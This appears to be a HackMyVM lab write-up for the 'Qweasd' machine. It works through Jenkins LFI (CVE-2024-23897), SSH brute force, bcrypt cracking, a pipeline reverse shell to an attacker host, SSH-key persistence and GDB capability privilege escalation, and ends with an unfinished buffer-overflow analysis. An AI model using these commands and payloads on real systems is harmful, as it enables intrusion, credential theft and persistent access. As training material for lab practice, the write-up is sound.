# Qweasd

## Recon

::: details nmap_scan.log.md
```log
Open 10.0.2.109:22
Open 10.0.2.109:8080
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.109
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 fa:b1:dc:5b:9e:54:8c:bd:24:4c:43:0c:25:fd:4d:d8 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBII0ziD38tcDlxwjZrDCiozYGINQspSN5ncXK2GoHX1kLI1L9al+R4GhjAKE6jB7ipn0Atz/RKIiJugqSE0DdW4=
|   256 29:71:69:ca:bc:74:48:26:45:34:77:69:29:a5:d2:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTbjSfk0S1wjrZGGkYU7F2VI7yvht724l+JXdkUFRUV
8080/tcp open  http    syn-ack Jetty 10.0.18
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP (Jenkins)

![writeup.png](/assets/pentest/hackmyvm/qweasd/writeup.png)

The website was awfully slow even tho it was localhost!

`curl` provided results much faster. I noticed the version and checked against exploit-db, it's vulnerable to LFI.
```bash
â””â”€$ curl 10.0.2.109:8080/asyncPeople -s | html2markdown
Skip to content

[![\[Jenkins\]](/static/6063062b/images/svgs/logo.svg)![Jenkins](/static/6063062b/images/title.svg)](/)

[![\[Jenkins\]](/static/6063062b/images/svgs/logo.svg)Jenkins](/)

[](https://www.jenkins.io/redirect/search-box)

[log in](/login?from=%2FasyncPeople)

  1. [Dashboard](/)
  2.

# ![](/static/6063062b/images/rage.svg) Oops!

## Not Found

This page may not exist, or you may not have permission to see it.

Jenkins 2.441

[ Get involved ](https://www.jenkins.io/participate/)[Website](https://www.jenkins.io/)

â””â”€$ searchsploit 'Jenkins 2.441'
----------------------------------------- ---------------------------------
 Exploit Title                             Path
----------------------------------------- ---------------------------------
Jenkins 2.441 - Local File Inclusion      java/webapps/51993.py
----------------------------------------- ---------------------------------

â””â”€$ searchsploit -m java/webapps/51993.py
  Exploit: Jenkins 2.441 - Local File Inclusion
      URL: https://www.exploit-db.com/exploits/51993
     Path: /usr/share/exploitdb/exploits/java/webapps/51993.py
    Codes: CVE-2024-23897
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/woyag/Desktop/Rooms/HackMyVM/Qweasd/51993.py
```

### LFI

- [Jenkins 2.441 - Local File Inclusion](https://www.exploit-db.com/exploits/51993)

```bash
â””â”€$ py 51993.py -u 'http://10.0.2.109:8080/' -p /etc/passwd | grep sh$
penetration:x:1001:1001::/home/penetration:/bin/bash
kali:x:1000:1000:asd:/home/kali:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

I was not able to find any sensitive files
```bash
â””â”€$ py 51993.py -u 'http://10.0.2.109:8080/' -p /home/kali/.ssh/id_rsa
File not found.

â””â”€$ py 51993.py -u 'http://10.0.2.109:8080/' -p /home/penetration/.ssh/id_rsa
File not found.

â””â”€$ py 51993.py -u 'http://10.0.2.109:8080/' -p /var/jenkins/secrets/initialAdminPassword
File not found.
```

### User.txt

```bash
â””â”€$ py 51993.py -u 'http://10.0.2.109:8080/' -p /home/penetration/user.txt
flag{Whynotjoinsomehackercommunicationgroups_}
```

## SSH

### Brute force (Unintended)

Personally I use passwords exclusively from Rockyou database for my VMs ðŸ˜‚ Imma guess that's true for Kali user.
```bash
â””â”€$ hydra -l kali -P /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt 10.0.2.109 ssh -t 64 -I
[22][ssh] host: 10.0.2.109   login: kali   password: asdfgh
```

```bash
â””â”€$ sshpass -p 'asdfgh' ssh kali@10.0.2.109
kali@asd:~$ id
uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
```

```bash
kali@asd:~$ sudo -l
Matching Defaults entries for kali on asd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User kali may run the following commands on asd:
    (ALL : ALL) ALL
kali@asd:~$ sudo su
root@asd:/home/kali# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```bash
root@asd:/home/kali# cat /root/root.txt
flag{Hackercommunicationgroup660930334iswaitingforyoutojoin_}
```

## Proper Exploit

I stumbled upon writeup from 0xdf [HTB: Builder](https://0xdf.gitlab.io/2024/02/12/htb-builder.html#cve-2024-23897-background) where he exploits the same CVE, properly by exfiltrating jenkins itself!

![writeup-1.png](/assets/pentest/hackmyvm/qweasd/writeup-1.png)

### Users

```bash
â””â”€$ py 51993.py -u 'http://10.0.2.109:8080/' -p /home/penetration/.jenkins/users/users.xml | grep string
      <string>an0ma1_6703692303677686036</string>
      <string>an0ma1</string>

â””â”€$ py 51993.py -u 'http://10.0.2.109:8080/' -p /home/penetration/.jenkins/users/an0ma1_6703692303677686036/config.xml | grep '>.*<'
  <id>an0ma1</id>
        <string>authenticated</string>
          <name>all</name>
          <filterQueue>false</filterQueue>
      <passwordHash>#jbcrypt:$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76</passwordHash>
      <emailAddress>1594743209@qq.com</emailAddress>
      <timestamp>1712972655377</timestamp>
      <insensitiveSearch>true</insensitiveSearch>
      <seed>e9885566be638620</seed>
      <providerId>default</providerId>
  <version>10</version>
          <filterExecutors>false</filterExecutors>
  <fullName>Mike</fullName>
```

```bash
â””â”€$ hashcat -a 0 -m 3200 ./hash $rockyou --user
$2a$10$3Ms0ektq3Nt8FBV8WeISb.Y.Xh81/VsOhZAhn5xhXzTZEFlsmGm76:369258
```

### Jenkins Pipeline RCE

- [Jenkins RCE Creating/Modifying Pipeline](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-creating-modifying-pipeline.html#jenkins-rce-creatingmodifying-pipeline)

```yaml
pipeline {
    agent any

    stages {
        stage('Hello') {
            steps {
                sh '''
                    /bin/bash -c "/bin/bash -i >& /dev/tcp/10.0.2.15/4444 0>&1"
                '''
            }
        }
    }
}
```

```bash
â””â”€$ penelope -p 4444
penetration@asd:~/.jenkins/workspace/rd$ id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)
```

### SSH

Upgrade persistance
```bash
â””â”€$ ssh-keygen -f id_rsa -P x -q
â””â”€$ echo "mkdir ~/.ssh; echo '$(cat id_rsa.pub)' > ~/.ssh/authorized_keys"
mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbfvxDLLDmCioRhp4ExWQAhgTrSJbOD/szIjlUpjbsz woyag@kraken' > ~/.ssh/authorized_keys
---
penetration@asd:~/.jenkins/workspace/rd$ mkdir ~/.ssh; echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMbfvxDLLDmCioRhp4ExWQAhgTrSJbOD/szIjlUpjbsz woyag@kraken' > ~/.ssh/authorized_keys
```

Login
```bash
â””â”€$ ssh -i id_rsa penetration@10.0.2.109
penetration@asd:~$ id
uid=1001(penetration) gid=1001(penetration) groups=1001(penetration)
```

### SUID Capabilities

Not sure if intended, but GDB has a SUID Capability.
```bash
penetration@asd:/opt/babyGift$ which gdb
/usr/bin/gdb
penetration@asd:/opt/babyGift$ ls -lh $(which gdb)
-rwxr-xr-x 1 root root 11M Nov 15  2023 /usr/bin/gdb
penetration@asd:/opt/babyGift$ getcap $(which gdb)
/usr/bin/gdb cap_setuid=ep
```

- [https://gtfobins.github.io/gtfobins/gdb/#capabilities](https://gtfobins.github.io/gtfobins/gdb/#capabilities)

```bash
penetration@asd:/opt/babyGift$ gdb -nx -ex 'python import os; os.setuid(0)' -ex '!bash' -ex quit
GNU gdb (Ubuntu 13.1-2ubuntu2.1) 13.1
Copyright (C) 2023 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
root@asd:/opt/babyGift# id
uid=0(root) gid=1001(penetration) groups=1001(penetration)
```


### Pwn (INCOMPLETE)

```bash
penetration@asd:~$ cat note.txt
Subject: CTF Practice PWN Challenge

Dear bamuwe,

I hope this email finds you well. I am aware that you are currently participating in a CTF competition, and I thought it would be helpful to provide you with a PWN challenge for practice. I have set up the latest version of PWNBDG for you to use conveniently.

Happy hacking!

Best regards,
An0ma1
```

```bash
penetration@asd:/opt/babyGift$ sudo -l
Matching Defaults entries for penetration on asd:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User penetration may run the following commands on asd:
    (ALL) NOPASSWD: /opt/babyGift/vuln
penetration@asd:/opt/babyGift$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f07a8288a8ac35cebbb04bb19386c5cdf83f797c, for GNU/Linux 3.2.0, not stripped
penetration@asd:/opt/babyGift$ file libc.so.6
libc.so.6: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c289da5071a3399de893d2af81d6a30c62646e1e, for GNU/Linux 3.2.0, stripped
penetration@asd:/opt/babyGift$ ldd vuln
        linux-vdso.so.1 (0x00007ffecad2b000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f63b8614000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f63b8821000)
```

Decompile
- [https://dogbolt.org/?id=938dc422-2e36-4ef3-b676-02347ed63301#BinaryNinja=93&Ghidra=158](https://dogbolt.org/?id=938dc422-2e36-4ef3-b676-02347ed63301#BinaryNinja=93&Ghidra=158)

![writeup-2.png](/assets/pentest/hackmyvm/qweasd/writeup-2.png)

Ask GPT to kindly salvage the original code
```c
#include <stdio.h>

void Menu() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    printf("Login...");
    putchar('\n');
}

void Gift(long arg) {
    long var = arg;
}

void GetInfo() {
    char buf1[32];
    char buf2[32];
    
    printf("Your name:");
    putchar('\n');
    fgets(buf1, 32, stdin);
    
    printf("Your passwd:");
    putchar('\n');
    fgets(buf2, 64, stdin);
}

int main() {
    Menu();
    GetInfo();
    return 0;
}
```

#### Buffer Overflow

The program is vulnerable to buffer overflow because we are reading 64 bytes into 32 buffer.

And
```bash
â””â”€$ checksec --file ./vuln
[*] '/home/woyag/Desktop/Rooms/HackMyVM/Qweasd/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

![writeup-3.png](/assets/pentest/hackmyvm/qweasd/writeup-3.png)

```bash
penetration@asd:/opt/babyGift$ pwndbg ./vuln
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> run
...
Your password:
PASTE
...
CRASH
...
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffe318 â—‚â€” 'faaaaaaagaaaaaaahaaaaaa'
*RIP  0x4012ae (GetInfo+134) â—‚â€” ret
...
pwndbg> cyclic -l faaaaaaa
Found at offset 40 # Will be important
```

```bash
â””â”€$ checksec --file ./vuln
    Arch:       amd64-64-little    # 64-bit x86, little-endian (binary uses 64-bit pointers/ABI)
    RELRO:      Full RELRO         # Relocation Read-Only enabled fully â€” GOT is made read-only after relocations (harder to overwrite GOT)
    Stack:      No canary found    # No stack canary present â€” stack buffer overflows that smash return addresses are easier
    NX:         NX enabled         # Non-Executable stack/segments â€” you cannot execute injected shellcode on the stack
    PIE:        No PIE (0x400000)  # Not position-independent; binary loads at a fixed address (makes return-to-text/ROP easier)
    SHSTK:      Enabled            # Shadow stack / stack-protection enabled â€” provides some control-flow integrity protections
    IBT:        Enabled            # Indirect Branch Tracking enabled (Intel CET) â€” mitigates certain indirect-branch/ROP attacks
    Stripped:   No                 # Symbols are present (not stripped) â€” function names and debug symbols make analysis easier
```

> **Note**: Im terrible with pwn, so excuse some GPT

## P.S. ðŸ’€

At some point I just gave up, not sure what I was supposed to do, maybe I'll come back after hints or some time after..

The **Gift** function is very suspicious to have or could just be red herring, either it's a ROP Chain or SUID gdb was the intended way for exploit.

